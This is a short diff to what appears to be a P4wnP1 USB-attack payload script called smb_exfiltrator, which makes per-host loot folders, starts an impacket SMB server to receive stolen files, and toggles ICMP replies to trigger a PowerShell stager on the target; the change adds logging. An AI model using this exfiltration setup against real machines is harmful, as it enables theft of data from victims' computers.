@@ -51,7 +51,7 @@ mkdir -p $LOOTDIR/$HOST-$COUNT
 mkdir -p /usr/local/P4wnP1/www/loot/smb_exfiltrator/$HOST-$COUNT
 
 # Start the SMB Server
-python3 /usr/share/doc/python3-impacket/examples/smbserver.py s /loot/smb_exfiltrator -smb2support &
+python3 /usr/share/doc/python3-impacket/examples/smbserver.py s /loot/smb_exfiltrator -smb2support | tee /usr/local/P4wnP1/www/loot/smb_exfiltrator/$HOST-$COUNT/log.txt &
 
 # Re-enable ICMP/echo replies to trip the powershell stager
 echo "0" > /proc/sys/net/ipv4/icmp_echo_ignore_all
